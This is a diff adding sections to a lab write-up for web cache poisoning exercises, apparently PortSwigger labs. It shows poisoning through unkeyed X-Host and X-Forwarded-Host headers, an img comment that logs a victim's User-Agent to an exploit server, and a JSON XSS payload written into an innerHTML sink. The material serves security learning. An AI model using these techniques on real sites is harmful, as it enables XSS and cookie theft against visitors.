@@ -51,3 +51,48 @@ Hosting our custom js file containing `alert(document.cookie)` along side with p
 
 ## Targeted web cache poisoning using an unknown header
 
+Using Param Miner we are able to discover that `x-host` header is supported.
+
+By testing this param we can notice that its value is being reflected in the path to tracking js script and that the param is unkeyed.
+
+By performing `GET /post?postId=1` request with `X-Host: exploit-0a170084036989dd8247205801bb009d.exploit-server.net` header we are able to poison a cache, which will then make a every request to js tracking script to our server, on which we will host `alert(document.cookie)` content. Everyone visitng the post page will trigger an XSS performing alert function call.
+
+Now in order to target the specific user, we need to get their `User-Agent`. This can be done by creating a new comment containing a link to our server. After visitng this post the `user-agent` will be logged. For this we create a new comment with a body:
+
+```
+<img src="https://exploit-0a170084036989dd8247205801bb009d.exploit-server.net/img.png" />
+```
+
+Now reading fromthe logs we notice the `user-agent` of the victim `Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36`.
+
+Now we again perform poisoning the cache for the `/post?postId=1`, but this time changing the request `user-agent` to the victims one and adding `Vary: User-Agent`. By this we will add to cache key particular `User-Agent`, limiting the cache poisoning only to that particular one, which after creating a new comment solves the lab.
+
+## Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria
+
+By inspecting the loaded content we can notice `geolocate.js` script, which fetches the content from provided as param url and passes it without sanitization into `innerHtml` sink.
+
+The function `initGeoLocate` performing this action is invoked in the main page and uses the param `data.host`, which is defined in other part of the file in different `script` tag.
+
+Param Miner was able to find `x-forwarded-host` header and we can confirm that it is being reflected in the `data.host` param, which, if poisoned, could potentially trigger an XXS by pointing it to our server, which will serve a payload passed to `innerHtml` sink.
+
+Using `x-forwarded-host` header we are able to poison the cache, which for further requests not containing the header still respond with reflected malicious host value. `session` cookie and `User-Agent` header seem to be unkeyed values.
+
+Now we can poison home page by performing `GET /` request with `X-Forwarded-Host: exploit-0ae0008c04b99d6f80a99890016d00b3.exploit-server.net` header. The Exploit server neet to be configured to serve proper file and respond with proper headers.
+
+File should be available at path `/resources/json/geolocate.json`. The headers should support CORS and have proper for json content type set:
+
+```
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Access-Control-Allow-Origin: https://0ab8005b04999d5280dc99e3003f0003.web-security-academy.net
+```
+
+The content of the response should be a json, which `country` param will be unsafetly passed to `innerHtml` sink:
+
+```
+{
+    "country": "United Kingdom <img src=X onerror=alert(document.cookie) />"
+}
+```
+
+Poisoning the cache this way and serving this file solves the lab.
